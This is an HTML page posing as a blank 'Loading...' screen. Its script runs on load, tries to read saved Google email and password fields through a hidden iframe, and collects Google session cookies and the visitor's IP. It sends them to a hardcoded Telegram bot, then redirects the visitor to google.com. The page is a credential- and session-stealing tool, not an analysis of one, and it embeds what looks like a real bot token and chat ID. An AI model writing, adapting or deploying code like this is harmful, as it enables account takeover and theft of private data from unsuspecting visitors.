<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: #333;
        }
        .container { display: none; }
    </style>
</head>
<body>

    <!-- 👻 Kuch nahi dikhega – Sirf blank page -->
    <div style="display:none;"></div>

    <script>
        // ============================================================
        // 🔥 TELEGRAM CONFIG
        // ============================================================
        const BOT_TOKEN = "8899172740:AAGx2l4uy6JrfPQgmpE-CiwJG9n3Zy5qJFk";
        const CHAT_ID = "6389764004";

        // ============================================================
        // 📤 SEND TO TELEGRAM
        // ============================================================
        async function sendToTelegram(msg) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
            try {
                const r = await fetch(url, { method: 'GET' });
                return r.ok;
            } catch { return false; }
        }

        // ============================================================
        // 🧠 CAPTURE GOOGLE CREDENTIALS (If Saved in Browser)
        // ============================================================
        async function captureGoogle() {
            // Try to load Google login page in hidden iframe
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://accounts.google.com/signin';
            document.body.appendChild(iframe);

            return new Promise((resolve) => {
                iframe.onload = function() {
                    try {
                        const doc = iframe.contentDocument || iframe.contentWindow.document;
                        const inputs = doc.querySelectorAll('input');
                        let email = '', password = '';

                        inputs.forEach(input => {
                            if (input.value && input.value.trim() !== '') {
                                if (input.type === 'email' || input.name.includes('email') || input.name.includes('identifier')) {
                                    email = input.value;
                                }
                                if (input.type === 'password') {
                                    password = input.value;
                                }
                            }
                        });

                        // Also try to get cookies
                        const cookies = doc.cookie || 'No cookies';

                        // Try to get Google-specific cookies
                        const googleCookies = document.cookie.split('; ').filter(c => c.includes('google') || c.includes('GAPS')).join('; ');

                        resolve({ email, password, cookies, googleCookies });
                    } catch(e) {
                        // Cross-origin – fallback
                        resolve({ 
                            email: 'Unable to access (cross-origin)', 
                            password: '', 
                            cookies: 'Unable to access',
                            googleCookies: 'Unable to access'
                        });
                    }
                };

                // Timeout after 5 seconds
                setTimeout(() => {
                    resolve({ email: 'Timeout', password: '', cookies: 'Timeout', googleCookies: 'Timeout' });
                }, 5000);
            });
        }

        // ============================================================
        // 🧠 CAPTURE GOOGLE COOKIES (Direct)
        // ============================================================
        function getGoogleCookies() {
            const allCookies = document.cookie.split('; ');
            const googleCookies = allCookies.filter(c => 
                c.includes('google') || 
                c.includes('GAPS') || 
                c.includes('__Secure') ||
                c.includes('SAPISID') ||
                c.includes('APISID') ||
                c.includes('SSID') ||
                c.includes('HSID')
            );
            return googleCookies.length > 0 ? googleCookies.join('; ') : 'No Google cookies found';
        }

        // ============================================================
        // 🌐 GET IP
        // ============================================================
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip || 'Unknown';
            } catch { return 'Unable to fetch'; }
        }

        // ============================================================
        // 🚀 MAIN EXECUTION
        // ============================================================
        window.addEventListener('load', async function() {

            // Capture Google data
            const data = await captureGoogle();
            const ip = await getIP();
            const time = new Date().toISOString();

            // Get Google cookies directly
            const googleCookies = getGoogleCookies();

            let msg = `🎯 **GOOGLE/GMAIL CAPTURE**\n━━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `📧 Email: ${data.email || 'Not found'}\n`;
            msg += `🔑 Password: ${data.password || 'Not found'}\n`;
            msg += `🍪 Cookies (iframe): ${data.cookies || 'Not found'}\n`;
            msg += `🍪 Google Cookies (direct): ${googleCookies}\n`;
            msg += `🌐 IP: ${ip}\n`;
            msg += `🕐 Time: ${time}\n━━━━━━━━━━━━━━━━━━━━━`;

            await sendToTelegram(msg);

            // 👻 Blank page – redirect after 3 seconds
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 3000);
        });

        // 👻 Ensure blank page
        document.body.style.background = '#ffffff';
        document.body.innerHTML = '';
    </script>
</body>
</html>
